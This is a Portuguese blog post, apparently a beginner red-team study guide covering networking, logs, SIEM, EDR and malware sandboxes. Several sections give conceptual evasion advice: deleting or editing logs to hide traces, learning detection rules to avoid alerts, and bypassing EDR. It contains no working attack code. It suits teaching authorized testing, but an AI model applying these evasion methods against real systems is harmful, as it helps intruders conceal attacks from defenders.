---
title: "Red Team: Analista de Cibersegurança Júnior"
date: 2025-06-26 16:30:00 -0300
categories: [Red Team, Nivel 1]
tags: [Teorica]
description: "Profissional em fase inicial que apoia as atividades de simulação de ataques, realiza tarefas básicas de reconhecimento e testes preliminares de vulnerabilidades sob supervisão. Está focado em aprender técnicas de ofensiva, ferramentas e metodologias para entender o funcionamento dos sistemas alvo."
image:
  path: /assets/img/RedTeamN1.png
  alt: Ilustração de um computador moderno com elementos de código e processamento
---

# 🔴 O que é Red Team?

O **Red Team** é um grupo de profissionais de segurança especializados em simular ataques reais contra sistemas, redes e pessoas, com o objetivo de identificar vulnerabilidades antes que atacantes reais o façam. É uma abordagem ofensiva dentro da segurança da informação.


## 🎯 Objetivo

Avaliar a **efetividade das defesas** da organização de forma realista, indo além dos testes tradicionais (como o pentest), simulando ameaças avançadas e persistentes (APT – Advanced Persistent Threat).


## 🔧 Atividades Comuns

- Simulação de invasões físicas e digitais  
- Testes de engenharia social (ex: phishing, vishing)  
- Exploração de falhas em aplicações e infraestrutura  
- Uso de técnicas avançadas para evitar detecção (evasão)  
- Desenvolvimento de malwares personalizados para testes  
- Avaliação da capacidade de resposta da equipe de defesa (Blue Team)


## 📌 Diferença entre Red Team e Pentest

| Característica        | Red Team                         | Pentest                        |
|-----------------------|----------------------------------|--------------------------------|
| Escopo                | Amplo e realista                 | Limitado e técnico             |
| Foco                  | Simular ataque real              | Encontrar vulnerabilidades     |
| Duração               | Semanas ou meses                 | Dias ou semanas                |
| Sigilo                | Alta discrição                   | Transparente com TI            |
| Detecção              | Deve **evitar ser detectado**    | Pode ser detectado             |


## 🧠 Perfis do Time

- Ethical Hacker / Offensive Security Expert  
- Exploit Developer  
- Especialista em Engenharia Social  
- Red Team Operator  
- Profissional com certificações como:  
  - OSCP / OSCE / OSEP  
  - CRTO (Certified Red Team Operator)  
  - eCPTX / eCPTXv2  


## 🛠️ Ferramentas Usadas

- **Cobalt Strike**, **Sliver**, **Mythic** (C2 frameworks)  
- **Metasploit**, **Impacket**, **BloodHound**, **Mimikatz**  
- Ferramentas próprias ou personalizadas  
- Scripts de evasão e ofuscação  
- Plataformas de phishing (GoPhish, King Phisher)


## 🔄 Relação com Outros Times

- **Blue Team (🔵):** O Red Team desafia o Blue Team, forçando-o a melhorar suas defesas.  
- **Purple Team (🟣):** Uma colaboração entre Red e Blue para melhorar continuamente os dois lados.  
- **White Team (⚪):** Define regras, monitora, garante a ética e neutralidade dos exercícios.


## 📚 Frameworks de Referência

- MITRE ATT&CK  
- Red Team Tactics (RTT)  
- NIST SP 800-115  
- TIBER-EU (Threat Intelligence-Based Ethical Red Teaming)


## ✅ Benefícios para a Organização

- Revela falhas reais de segurança, inclusive humanas  
- Melhora a prontidão da equipe de resposta a incidentes  
- Testa defesas em cenários realistas  
- Reduz o impacto de ataques reais

# 🔴 Red Team N1: Conceitos Básicos de Segurança da Informação – Confidencialidade, Integridade e Disponibilidade (CIA)

Antes de planejar e executar ataques simulados, é fundamental entender os princípios básicos que regem a segurança da informação. O modelo CIA (Confidencialidade, Integridade e Disponibilidade) guia tanto defensores quanto ofensores na proteção e exploração de sistemas.

Conheça o terreno para atacar com eficácia.

---

## 🧠 O que é o modelo CIA?

O modelo CIA define três objetivos principais que toda segurança deve buscar:

- **Confidencialidade:** garantir que a informação seja acessível apenas a quem tem permissão  
- **Integridade:** assegurar que os dados não sejam alterados indevidamente  
- **Disponibilidade:** manter o acesso à informação e sistemas sempre que necessário  

---

## 🧱 Impacto do modelo CIA no Red Team

### 1. Confidencialidade

- Identificar formas de acessar dados restritos (exfiltração)  
- Explorar falhas em controles de acesso e autenticação  
- Bypass de criptografia e engenharia social para obter credenciais  

### 2. Integridade

- Investigar formas de alterar dados para desestabilizar sistemas ou encobrir rastros  
- Modificação de logs, arquivos e configurações para esconder presença  
- Ataques de injeção e manipulação de processos  

### 3. Disponibilidade

- Avaliar vulnerabilidades que causem interrupção (DoS/DDoS)  
- Impactar sistemas críticos para gerar impacto operacional  
- Planejar ataques que causem degradação do serviço sem detecção imediata  

---

## 🔍 Exemplos práticos

```
- Confidencialidade: phishing para capturar credenciais administrativas  
- Integridade: alteração de registros para evitar detecção em uma invasão  
- Disponibilidade: ataque de negação de serviço contra um servidor web  
```

---

## ⚙️ Como usar o modelo CIA para planejar ataques

- Analise quais pilares são mais frágeis no alvo para escolher a estratégia  
- Explore a cadeia de ataques que comprometam um ou mais pilares  
- Utilize técnicas avançadas para maximizar o impacto e minimizar a detecção  
- Prepare-se para adaptar o ataque conforme as defesas identificadas  

---

## ✅ Conclusão

Entender Confidencialidade, Integridade e Disponibilidade é fundamental para que um Red Team N1 planeje ataques eficazes e realistas. Dominar esses conceitos ajuda a identificar pontos fracos e maximizar o sucesso das simulações ofensivas.

---

# 🔴 Red Team N1: Fundamentos de Redes – TCP/IP, DNS e HTTP

Para atuar com eficácia em Red Team, é essencial dominar os fundamentos das redes, pois grande parte das técnicas ofensivas depende do entendimento dos protocolos de comunicação. Conhecer TCP/IP, DNS e HTTP ajuda a mapear alvos, explorar vulnerabilidades e evadir defesas.

Domine a rede para atacar com precisão.

---

## 🧠 Principais protocolos para o Red Team

- **TCP/IP:** base da comunicação na internet, permite troca de pacotes entre dispositivos  
- **DNS:** serviço de resolução de nomes que traduz domínios em endereços IP  
- **HTTP:** protocolo usado para comunicação web, alvo frequente de ataques  

---

## 🧱 Conceitos essenciais

### 1. TCP/IP

- Modelo em camadas: Aplicação, Transporte, Internet, Link  
- TCP: conexão confiável, controle de fluxo e retransmissão  
- IP: roteamento e endereçamento dos pacotes  
- Ferramentas: nmap para escaneamento e análise de portas  

### 2. DNS

- Como funciona a resolução de nomes em IPs  
- Tipos de registros DNS: A, MX, CNAME, TXT  
- Técnicas de ataque: DNS spoofing, DNS tunneling  

### 3. HTTP

- Funcionamento básico do protocolo (requests e responses)  
- Métodos comuns: GET, POST, PUT, DELETE  
- Exploração: ataques de injeção, XSS, manipulação de headers  

---

## 🔍 Exemplos práticos

```
- TCP/IP: usar nmap para mapear portas abertas no alvo  
- DNS: coletar informações públicas via DNS enumeration  
- HTTP: testar formulários web para vulnerabilidades de injeção  
```

---

## ⚙️ Como aplicar no Red Team

- Utilize o conhecimento para planejar fases de reconhecimento e exploração  
- Explore fraquezas na configuração dos protocolos para obter acesso  
- Use técnicas de evasão baseadas no comportamento dos protocolos  
- Combine informações obtidas para construir ataques mais eficazes  

---

## ✅ Conclusão

Dominar os fundamentos de TCP/IP, DNS e HTTP é crucial para qualquer Red Team N1 que deseja realizar ataques realistas e eficientes. Esses protocolos são a base das comunicações e seu conhecimento abre portas para inúmeras técnicas ofensivas.

---

# 🔴 Red Team N1: Instalando VMs para Laboratório – Kali Linux (Red Team) e Security Onion/Windows Server (Blue Team)

Montar um laboratório prático é fundamental para o desenvolvimento das habilidades de Red Team. Ter um ambiente controlado com máquinas para ataque (Kali Linux) e defesa (Security Onion ou Windows Server) permite simular cenários reais e testar técnicas sem riscos.

Prepare seu ambiente para praticar com segurança.

---

## 🧠 Por que montar um laboratório com VMs?

- Praticar ataques e defesas em ambiente seguro  
- Testar ferramentas, técnicas e estratégias com liberdade  
- Entender o comportamento dos sistemas e respostas a ataques  
- Desenvolver habilidades de análise e mitigação  

---

## 🧱 Passos para instalação das VMs

### 1. Escolher a plataforma de virtualização

- Recomendo: **VirtualBox** (gratuito) ou **VMware Workstation Player**  
- Instale no seu computador conforme o sistema operacional  

### 2. Baixar as imagens ISO

- **Kali Linux:** [https://www.kali.org/get-kali/](https://www.kali.org/get-kali/)  
- **Security Onion:** [https://securityonion.net/](https://securityonion.net/)  
- **Windows Server:** obtenha via portal da Microsoft ou licenças de avaliação  

### 3. Criar a VM Kali Linux

- Configurar memória (mínimo 2GB, recomendado 4GB+)  
- Definir disco virtual (mínimo 20GB)  
- Configurar rede em modo bridge ou NAT para comunicação com outras VMs  
- Instalar Kali a partir do ISO baixado  

### 4. Criar a VM Security Onion ou Windows Server

- Configurar recursos semelhantes (memória, disco)  
- Instalar a partir do ISO ou imagem correspondente  
- Configurar rede para comunicar com Kali e com seu host  

---

## 🔍 Dicas para configuração e uso

```
- Reserve uma rede virtual interna para isolar o laboratório da rede principal  
- Atualize os sistemas e instale ferramentas adicionais conforme necessidade  
- Configure snapshots para salvar estados antes de testes importantes  
- Pratique comandos básicos, ataques simulados e análise de logs entre as VMs  
```

---

## ✅ Conclusão

Ter um laboratório com Kali Linux para Red Team e Security Onion ou Windows Server para Blue Team é essencial para a prática segura e eficaz. Esse ambiente facilita o aprendizado, experimentação e desenvolvimento de habilidades práticas.

---

# 🔴 Red Team N1: Material de Estudo – Curso Introdutório de Segurança e Recursos no YouTube

Para iniciar sua jornada no Red Team, é fundamental construir uma base sólida com conteúdos introdutórios que abordem os conceitos essenciais de segurança da informação. Cursos online e vídeos no YouTube são ótimas formas de absorver o conhecimento de forma acessível e prática.

Comece com o básico para construir seu futuro.

---

## 🧠 Por que começar com cursos introdutórios?

- Explicam conceitos fundamentais e terminologias  
- Apresentam cenários reais e exemplos práticos  
- Fornecem estrutura para aprofundar estudos futuros  
- Facilitam o entendimento de segurança ofensiva e defensiva  

---

## 🧱 Sugestões de materiais iniciais

### 1. Cursos introdutórios

- **“Cybersecurity Basics”** – curso gratuito disponível em plataformas como Coursera, Udemy ou Cybrary  
- **“Introduction to Cyber Security”** da Cisco Networking Academy  
- **“Fundamentals of Cybersecurity”** no edX  

### 2. Canais do YouTube

- **NetworkChuck** – explica desde o básico até tópicos avançados de segurança e redes  
- **The Cyber Mentor** – conteúdo prático voltado para Red Team e pentesting  
- **HackerSploit** – tutoriais sobre hacking ético, segurança e ferramentas  

---

## 🔍 Dicas para aproveitar o material

```
- Faça anotações e revise os conteúdos periodicamente  
- Pratique o que aprendeu em laboratórios virtuais e VMs  
- Combine vídeos com leitura complementar para fixar o conhecimento  
- Participe de comunidades para tirar dúvidas e trocar experiências  
```

---

## ✅ Conclusão

Utilizar cursos introdutórios e vídeos do YouTube é uma excelente maneira de iniciar sua trajetória no Red Team. O aprendizado constante e a prática farão a diferença para sua evolução profissional.

---

# 🔴 Red Team N1: Estudo Detalhado dos Modelos OSI e TCP/IP

Dominar os modelos OSI e TCP/IP é fundamental para qualquer profissional de Red Team. Compreender as camadas que estruturam as redes ajuda a identificar pontos de ataque, analisar tráfego e explorar vulnerabilidades com maior precisão.

Conhecimento profundo da rede é chave para um ataque eficaz.

---

## 🧠 O que são os modelos OSI e TCP/IP?

- **Modelo OSI:** referência teórica que divide a comunicação em 7 camadas distintas  
- **Modelo TCP/IP:** modelo prático usado na internet, com 4 camadas principais  
- Ambos ajudam a entender como os dados transitam e onde atacar ou defender  

---

## 🧱 Detalhes das camadas

### Modelo OSI (7 camadas)

1. **Física:** transmissão de bits brutos (cabos, sinais elétricos)  
2. **Enlace:** controle de acesso ao meio e detecção de erros (MAC, switches)  
3. **Rede:** roteamento e endereçamento (IP)  
4. **Transporte:** controle de fluxo e entrega confiável (TCP, UDP)  
5. **Sessão:** controle de conexões e sessões  
6. **Apresentação:** formatação, criptografia e compressão  
7. **Aplicação:** protocolos finais como HTTP, FTP, DNS  

### Modelo TCP/IP (4 camadas)

1. **Link:** equivalente a física + enlace  
2. **Internet:** roteamento (IP)  
3. **Transporte:** TCP/UDP  
4. **Aplicação:** protocolos e serviços (HTTP, DNS, SMTP)  

---

## 🔍 Como aplicar no Red Team

```
- Identificar em qual camada o alvo pode ser explorado (ex: injeção na aplicação, spoofing na rede)  
- Analisar tráfego capturado para detectar anomalias  
- Explorar falhas específicas em protocolos de cada camada  
- Planejar ataques combinando múltiplas camadas para maior eficácia  
```

---

## ⚙️ Ferramentas úteis para estudo

- Wireshark para análise de pacotes  
- tcpdump para captura em linha de comando  
- Ferramentas de mapeamento de rede como nmap  
- Simuladores de redes e laboratórios virtuais  

---

## ✅ Conclusão

Estudar os modelos OSI e TCP/IP detalhadamente é um passo essencial para se tornar um Red Team eficaz. Com esse conhecimento, você entenderá melhor o funcionamento das redes e poderá identificar e explorar vulnerabilidades com mais precisão.

---

# 🔴 Red Team N1: Entendendo Protocolos TCP, UDP e ICMP

Para um Red Team eficaz, conhecer como funcionam os principais protocolos de rede é essencial. TCP, UDP e ICMP são protocolos fundamentais usados para comunicação entre dispositivos e, também, vetores comuns em técnicas de ataque e reconhecimento.

Domine esses protocolos para mapear e explorar alvos com eficiência.

---

## 🧠 O que são TCP, UDP e ICMP?

- **TCP (Transmission Control Protocol):** protocolo orientado à conexão, confiável e que garante entrega dos dados  
- **UDP (User Datagram Protocol):** protocolo sem conexão, rápido e sem garantia de entrega, usado para transmissões rápidas  
- **ICMP (Internet Control Message Protocol):** protocolo para troca de mensagens de controle e diagnóstico na rede  

---

## 🧱 Características principais

### TCP

- Estabelece conexão via handshake de 3 vias (SYN, SYN-ACK, ACK)  
- Controle de fluxo e retransmissão de pacotes perdidos  
- Usado por protocolos como HTTP, FTP, SMTP  
- Ataques comuns: TCP SYN Flood (DoS), hijacking de sessão  

### UDP

- Comunicação sem conexão e sem confirmação de entrega  
- Usado para DNS, VoIP, streaming  
- Menor overhead, mas maior chance de perda de pacotes  
- Ataques comuns: UDP Flood, reflexão/amplificação  

### ICMP

- Utilizado para mensagens de erro e teste (ping, traceroute)  
- Fundamental para diagnóstico e manutenção da rede  
- Ataques comuns: ICMP Flood (ping flood), ICMP redirect  

---

## 🔍 Exemplos práticos

```
- TCP: usar nmap para detectar portas TCP abertas no alvo  
- UDP: realizar scan UDP para identificar serviços em execução  
- ICMP: ping para verificar se o host está ativo e responder a testes  
```

---

## ⚙️ Aplicação no Red Team

- Use TCP para exploração de serviços com conexão garantida  
- Explore UDP para identificar serviços rápidos e menos protegidos  
- Utilize ICMP para mapeamento inicial e evasão de firewall  
- Combine varreduras com análise dos protocolos para planejar ataques precisos  

---

## ✅ Conclusão

Compreender os protocolos TCP, UDP e ICMP é fundamental para um Red Team N1 planejar e executar ataques efetivos. O domínio desses protocolos ajuda a identificar superfícies de ataque e a evitar detecção durante operações ofensivas.

---

# 🔴 Red Team N1: Ferramenta Wireshark – Captura e Análise Simples de Pacotes

Para um Red Team eficiente, entender o tráfego de rede é essencial. O Wireshark é uma das ferramentas mais poderosas e populares para capturar e analisar pacotes de rede, permitindo identificar comunicações, protocolos e potenciais vulnerabilidades.

Use o Wireshark para enxergar o que passa pela rede.

---

## 🧠 O que é o Wireshark?

- Ferramenta de código aberto para captura e análise de tráfego de rede  
- Suporta centenas de protocolos e formatos diferentes  
- Permite filtragem e inspeção detalhada de pacotes capturados  
- Fundamental para investigação, diagnóstico e pentests  

---

## 🧱 Funcionalidades básicas

- Captura ao vivo do tráfego da interface de rede  
- Filtros para exibir somente pacotes de interesse (ex: `tcp`, `http`)  
- Decodificação dos protocolos para leitura humana  
- Estatísticas e gráficos para análise do comportamento da rede  

---

## 🔍 Passos simples para começar

```
1. Inicie o Wireshark e selecione a interface de rede para captura  
2. Use filtros básicos para focar no tráfego desejado (ex: `ip.addr == 192.168.1.10`)  
3. Analise os pacotes capturados, observando origem, destino e protocolo  
4. Utilize a função “Follow TCP Stream” para ver a conversa completa  
```

---

## ⚙️ Aplicação no Red Team

- Identificar serviços ativos e protocolos usados no alvo  
- Capturar dados que possam conter credenciais ou informações sensíveis  
- Analisar respostas a ataques de rede para ajustar estratégias  
- Detectar anomalias ou comportamento suspeito no tráfego  

---

## ✅ Conclusão

Dominar o Wireshark permite ao Red Team N1 obter uma visão clara do tráfego de rede, fundamental para reconhecimento, exploração e pós-exploração. Comece simples, evolua para análises mais complexas e use essa ferramenta para maximizar seu impacto ofensivo.

---

# 🔴 Red Team N1: Prática – Capturar Tráfego da Rede e Analisar Conexões Básicas

A melhor forma de aprender sobre redes e segurança ofensiva é colocando a mão na massa. Capturar e analisar o tráfego da sua rede local ajuda a entender o funcionamento dos protocolos e identificar padrões de comunicação.

Vamos praticar!

---

## 🧠 Objetivo da prática

- Capturar pacotes de rede em tempo real  
- Identificar conexões básicas entre dispositivos  
- Reconhecer protocolos e padrões comuns  
- Preparar o terreno para análises mais complexas  

---

## 🧱 Passos para a captura e análise

### 1. Preparar o ambiente

- Use Wireshark instalado na sua máquina ou em uma VM  
- Certifique-se de ter permissões para capturar tráfego na interface de rede  

### 2. Capturar o tráfego

- Abra o Wireshark e selecione a interface correta (ex: Wi-Fi, Ethernet)  
- Inicie a captura de pacotes ao vivo  

### 3. Filtrar conexões básicas

- Use filtros simples para focar em conexões comuns:  
  - `tcp` para tráfego TCP  
  - `udp` para tráfego UDP  
  - `icmp` para mensagens de controle  
- Observe endereços IP, portas e protocolos  

### 4. Analisar conexões

- Clique em pacotes individuais para ver detalhes  
- Use “Follow TCP Stream” para entender conversas completas  
- Identifique serviços acessados (ex: HTTP, DNS)  

---

## 🔍 Dicas para a análise

```
- Observe padrões repetitivos que indiquem serviços ativos  
- Identifique fluxos de dados entre seu dispositivo e servidores externos  
- Procure por tráfego não usual ou desconhecido  
- Registre insights para melhorar seus ataques ou defesas futuras  
```

---

## ✅ Conclusão

Praticar a captura e análise de tráfego básico é essencial para qualquer Red Team N1. Essa habilidade permite entender o comportamento da rede e planejar ataques mais eficazes com base em evidências reais.

---

# 🔴 Red Team N1: Conceitos Básicos de Sistemas Windows e Linux – Arquivos, Permissões e Processos

Para atuar com eficiência em Red Team, é fundamental entender como funcionam os sistemas operacionais Windows e Linux, especialmente no que diz respeito ao gerenciamento de arquivos, permissões e processos. Esse conhecimento permite explorar vulnerabilidades e controlar sistemas de forma eficaz.

Conheça a base para suas operações ofensivas.

---

## 🧠 Fundamentos dos sistemas operacionais

- Windows e Linux são os sistemas mais comuns em ambientes corporativos  
- Cada um tem estrutura própria para arquivos, permissões e gerenciamento de processos  
- Saber navegar e manipular esses elementos é essencial para exploração e pós-exploração  

---

## 🧱 Arquivos

### Windows

- Arquivos organizados em pastas e unidades (C:\, D:\)  
- Extensões indicam o tipo (ex: .exe, .dll, .txt)  
- Atributos como oculto, sistema e somente leitura  

### Linux

- Arquivos e diretórios organizados em uma árvore única iniciando no `/`  
- Sem extensões obrigatórias, mas convencionais (ex: .sh, .conf)  
- Tipos variados: arquivos regulares, diretórios, links simbólicos, dispositivos  

---

## 🧱 Permissões

### Windows

- Controle via ACL (Access Control Lists)  
- Permissões principais: leitura, escrita, execução  
- Herança e propagação de permissões em pastas  

### Linux

- Permissões básicas para dono, grupo e outros (rwx)  
- Representadas por bits e símbolos (ex: `rwxr-xr--`)  
- Comandos para gerenciar: `chmod`, `chown`, `chgrp`  

---

## 🧱 Processos

### Windows

- Gerenciador de tarefas mostra processos e serviços  
- Processos podem ser iniciados por usuário ou sistema  
- Ferramentas para análise: Task Manager, Process Explorer  

### Linux

- Processos gerenciados via PID (Process ID)  
- Comandos comuns: `ps`, `top`, `kill`  
- Hierarquia de processos e uso de sinais para controle  

---

## 🔍 Exemplos práticos

```
- Windows: verificar permissões de um arquivo via propriedades  
- Linux: usar `ls -l` para listar permissões de arquivos  
- Analisar processos ativos com Task Manager (Windows) e `top` (Linux)  
```

---

## ⚙️ Aplicação no Red Team

- Explorar permissões incorretas para escalonamento de privilégios  
- Identificar processos críticos para manipulação ou injeção de código  
- Navegar e manipular arquivos para persistência e exfiltração  
- Usar comandos nativos para evitar detecção em ambientes monitorados  

---

## ✅ Conclusão

Dominar os conceitos básicos de arquivos, permissões e processos em Windows e Linux é indispensável para o Red Team N1. Com essa base, você pode planejar ataques mais eficientes e furtivos, aproveitando as particularidades de cada sistema.

---

# 🔴 Red Team N1: Onde Encontrar Logs no Windows e Linux – Event Viewer e /var/log

Analisar logs é uma das principais atividades no Red Team para entender o que aconteceu em um sistema, identificar atividades suspeitas e planejar movimentos furtivos. Conhecer os locais e ferramentas para acessar logs é essencial para qualquer profissional.

Saiba onde os sistemas guardam seus rastros.

---

## 🧠 Importância dos logs

- Documentam eventos, erros, acessos e atividades do sistema  
- São fontes valiosas para identificar comportamentos anormais  
- Ferramentas de defesa usam logs para detectar e alertar sobre ameaças  

---

## 🧱 Logs no Windows

- **Event Viewer** (Visualizador de Eventos) é a ferramenta padrão para acessar logs  
- Principais categorias:  
  - **Application:** eventos de aplicativos instalados  
  - **Security:** logs de segurança (login, falhas, auditoria)  
  - **System:** eventos do sistema operacional e drivers  
- Logs ficam armazenados em arquivos `.evtx` no sistema  

---

## 🧱 Logs no Linux

- Diretório padrão: `/var/log/`  
- Principais arquivos e diretórios:  
  - `syslog` ou `messages`: logs gerais do sistema  
  - `auth.log` ou `secure`: logs de autenticação e sudo  
  - `kern.log`: mensagens do kernel  
  - `dmesg`: buffer do kernel, informações de hardware  
  - Logs específicos de serviços (ex: `/var/log/apache2/`)  

---

## 🔍 Exemplos práticos

```
- Windows: abrir Event Viewer (`eventvwr.msc`) e navegar em Security > Logon para eventos de login  
- Linux: usar comandos `cat /var/log/auth.log` ou `tail -f /var/log/syslog` para acompanhar logs em tempo real  
- Filtrar logs para eventos de interesse usando filtros no Event Viewer ou `grep` no Linux  
```

---

## ⚙️ Aplicação no Red Team

- Revisar logs para identificar pontos de detecção e evitar alertas  
- Apagar ou modificar logs para ocultar rastros após invasão (com cuidado e ética)  
- Monitorar logs para identificar falhas e oportunidades de escalonamento  
- Entender o padrão normal para detectar anomalias em testes ofensivos  

---

## ✅ Conclusão

Saber onde encontrar e como analisar logs no Windows e Linux é uma habilidade crítica para o Red Team N1. O domínio dessas fontes ajuda a mapear sistemas, planejar ataques e entender respostas dos alvos.

---

# 🔴 Red Team N1: Como Interpretar Logs Comuns – Login e Eventos de Segurança

Interpretar logs é uma habilidade essencial para entender o comportamento de sistemas e identificar atividades suspeitas durante testes de Red Team. Logs de login e eventos de segurança são fontes ricas para detectar tentativas de acesso, falhas e possíveis invasões.

Aprenda a ler os sinais que os sistemas deixam.

---

## 🧠 Por que interpretar logs?

- Revela tentativas de acesso legítimas e maliciosas  
- Ajuda a detectar padrões anormais e ataques em andamento  
- Fornece evidências para análise forense e planejamento de ataques futuros  

---

## 🧱 Logs comuns para analisar

### 1. Logs de Login

- Indicam quando e por quem um usuário acessou o sistema  
- Informações típicas: usuário, horário, endereço IP, sucesso ou falha  
- Atenção a falhas repetidas, logins fora do horário ou de locais incomuns  

### 2. Eventos de Segurança

- Incluem alterações em permissões, execução de comandos críticos, criação de contas  
- Alertam para atividades suspeitas, como tentativas de escalonamento ou acesso privilegiado  
- Monitorar eventos de auditoria e acesso a arquivos sensíveis  

---

## 🔍 Exemplos práticos de interpretação

```
- Login falho repetido pode indicar ataque de força bruta  
- Login bem-sucedido de usuário desconhecido ou fora do horário normal  
- Modificações em contas administrativas sem autorização  
- Execução de comandos incomuns em horários atípicos  
```

---

## ⚙️ Dicas para análise eficiente

- Use ferramentas para filtrar e correlacionar eventos  
- Entenda o padrão normal de operação para identificar anomalias  
- Combine análise de diferentes logs para contexto completo  
- Documente descobertas para informar a equipe e ajustar ataques  

---

## ✅ Conclusão

Interpretar logs de login e eventos de segurança é uma competência chave para o Red Team N1. Saber identificar sinais de acesso e atividades suspeitas permite ajustar estratégias ofensivas e evitar detecção.

---

# 🔴 Red Team N1: Prática – Analisar Logs Locais e Buscar Atividades Suspeitas

Colocar a teoria em prática é fundamental para aprimorar suas habilidades no Red Team. Analisar logs locais ajuda a identificar padrões anormais e atividades maliciosas que podem indicar invasões ou tentativas de ataque.

Vamos treinar a caça aos sinais!

---

## 🧠 Objetivo da prática

- Examinar logs de sistemas Windows e Linux  
- Identificar eventos fora do padrão e suspeitos  
- Entender como reconhecer ataques e comportamentos maliciosos  
- Desenvolver rotina de análise para uso em testes e investigações  

---

## 🧱 Passos para análise

### 1. Preparar o ambiente

- Acesse a máquina alvo (física ou VM) com permissões adequadas  
- Para Windows, use o Event Viewer; para Linux, acesse arquivos em `/var/log/`  

### 2. Coletar logs relevantes

- Windows: focar em logs de segurança, sistema e aplicação  
- Linux: analisar `auth.log`, `syslog`, `kern.log` e logs específicos de serviços  

### 3. Buscar atividades suspeitas

- Falhas repetidas de login  
- Acessos em horários incomuns  
- Criação ou alteração de usuários e permissões  
- Execução de comandos ou serviços não autorizados  

### 4. Documentar e correlacionar

- Anote eventos importantes e timestamps  
- Correlacione com outras fontes e comportamentos observados  
- Gere relatórios simples para consolidar a análise  

---

## 🔍 Exemplos de comandos e ações

```
- Windows: usar filtros no Event Viewer para “Logon Failure” e eventos críticos  
- Linux: comandos como `grep "failed" /var/log/auth.log` e `tail -f /var/log/syslog`  
- Procurar por eventos que indiquem escalonamento de privilégios ou movimentação lateral  
```

---

## ✅ Conclusão

Praticar a análise de logs locais e identificar atividades suspeitas fortalece a capacidade do Red Team N1 de detectar e explorar falhas. Essa rotina é essencial para testes mais precisos e para aprimorar sua visão ofensiva.

---

# 🔴 Red Team N1: Introdução a SIEM – Conceitos e Uso Básico (Splunk, Elastic Stack)

SIEM (Security Information and Event Management) é uma tecnologia fundamental para a segurança corporativa, agregando, correlacionando e analisando logs e eventos de múltiplas fontes. Para o Red Team, entender o funcionamento do SIEM ajuda a planejar ataques que evadem ou manipulam esses sistemas.

Conheça a ferramenta que os defensores usam para detectar você.

---

## 🧠 O que é SIEM?

- Plataforma que coleta e centraliza logs de sistemas, redes e aplicações  
- Correlaciona eventos para identificar ameaças e anomalias  
- Gera alertas e dashboards para monitoramento em tempo real  
- Exemplos populares: **Splunk**, **Elastic Stack (ELK)**, IBM QRadar  

---

## 🧱 Componentes principais

- **Coleta de dados:** agentes ou métodos que enviam logs para o SIEM  
- **Armazenamento:** banco de dados otimizado para grandes volumes de dados  
- **Análise:** correlação, busca e visualização de eventos  
- **Resposta:** alertas automáticos e integração com sistemas de resposta  

---

## 🔍 Uso básico para Red Team

```
- Entender quais tipos de logs e eventos o SIEM monitora no ambiente alvo  
- Conhecer regras e padrões de detecção para evitar alertas durante ataques  
- Testar técnicas de evasão baseadas em manipulação de logs e eventos  
- Monitorar dashboards públicos para aprender sobre alertas comuns  
```

---

## ⚙️ Exemplos práticos de SIEMs populares

- **Splunk:** interface web intuitiva, poderosa busca e análise em tempo real  
- **Elastic Stack:** conjunto open source (Elasticsearch, Logstash, Kibana) para coleta e visualização  
- Integração com várias fontes e APIs para automação de respostas  

---

## ✅ Conclusão

Para o Red Team N1, conhecer o conceito e uso básico de SIEMs como Splunk e Elastic Stack é vital para planejar ataques furtivos e eficazes. Dominar essas ferramentas auxilia na compreensão das defesas e na criação de estratégias mais avançadas.

---

# 🔴 Red Team N1: Uso de EDR – Endpoint Detection and Response

EDR (Endpoint Detection and Response) é uma tecnologia avançada que monitora e coleta dados dos endpoints (dispositivos finais) para detectar, investigar e responder a ameaças em tempo real. Para o Red Team, entender como o EDR funciona é essencial para planejar ataques que evadem ou contornam essas defesas.

Conheça o guardião dos endpoints para melhorar sua estratégia ofensiva.

---

## 🧠 O que é EDR?

- Solução focada em detectar atividades suspeitas nos endpoints  
- Coleta dados detalhados de processos, arquivos, rede e comportamento  
- Fornece alertas, análises forenses e respostas automáticas ou manuais  
- Exemplos populares: CrowdStrike Falcon, Carbon Black, Microsoft Defender for Endpoint  

---

## 🧱 Principais funcionalidades

- Monitoramento contínuo de endpoints  
- Detecção de ameaças baseada em comportamento e assinaturas  
- Análise automatizada e manual de incidentes  
- Resposta rápida: isolamento, bloqueio de processos e remoção de ameaças  

---

## 🔍 Como o Red Team pode usar esse conhecimento

```
- Entender as técnicas comuns que EDRs detectam para evitar alertas  
- Testar ferramentas e métodos para desativar ou burlar EDRs (com ética e autorização)  
- Analisar os logs e alertas gerados para ajustar ataques futuros  
- Simular ataques reais considerando a presença do EDR para treino da equipe Blue Team  
```

---

## ⚙️ Exemplos práticos

- Reconhecer comportamentos que disparam alertas (ex: execução de payloads, elevação de privilégios)  
- Utilizar técnicas de “living off the land” para minimizar rastros  
- Avaliar os mecanismos de resposta automática para evitar isolamento do endpoint  

---

## ✅ Conclusão

Compreender o uso e funcionamento do EDR é crucial para o Red Team N1 que deseja planejar ataques furtivos e eficazes. Esse conhecimento permite antecipar defesas e explorar brechas para maximizar o sucesso ofensivo.

---

# 🔴 Red Team N1: Ferramentas de Sandbox para Análise de Malware – AnyRun e Hybrid Analysis

Para o Red Team, entender como funcionam as sandboxes é fundamental para analisar amostras de malware e antecipar as estratégias do adversário. Ferramentas como AnyRun e Hybrid Analysis permitem executar arquivos suspeitos em ambientes controlados, revelando comportamentos maliciosos.

Use essas ferramentas para ampliar sua visão ofensiva.

---

## 🧠 O que são sandboxes?

- Ambientes isolados que executam códigos suspeitos com segurança  
- Monitoram ações do malware: arquivos criados, conexões de rede, processos, modificações no sistema  
- Geram relatórios detalhados para análise técnica e inteligência  

---

## 🧱 Ferramentas populares

### 1. AnyRun

- Sandbox interativa online  
- Permite execução e monitoramento em tempo real  
- Interface amigável para análises manuais e colaborativas  
- Útil para análises rápidas e demonstrações  

🔗 [https://any.run/](https://any.run/)

### 2. Hybrid Analysis

- Sandbox mantida pela CrowdStrike  
- Análise automática com múltiplas engines e heurísticas  
- Relatórios detalhados com indicadores técnicos e comportamento  
- Suporta vários tipos de arquivos, incluindo scripts e documentos  

🔗 [https://www.hybrid-analysis.com/](https://www.hybrid-analysis.com/)

---

## 🔍 Como o Red Team pode usar?

```
- Entender técnicas usadas por malwares para evitar detecção  
- Analisar amostras próprias para testar defesas e estratégias  
- Criar payloads personalizados inspirados em comportamentos observados  
- Preparar relatórios para compartilhar conhecimento com a equipe  
```

---

## ✅ Conclusão

Dominar o uso de sandboxes como AnyRun e Hybrid Analysis permite ao Red Team N1 ampliar sua capacidade de análise e desenvolvimento de técnicas ofensivas. Essas ferramentas são aliados valiosos para quem quer entender o comportamento real dos malwares.

---

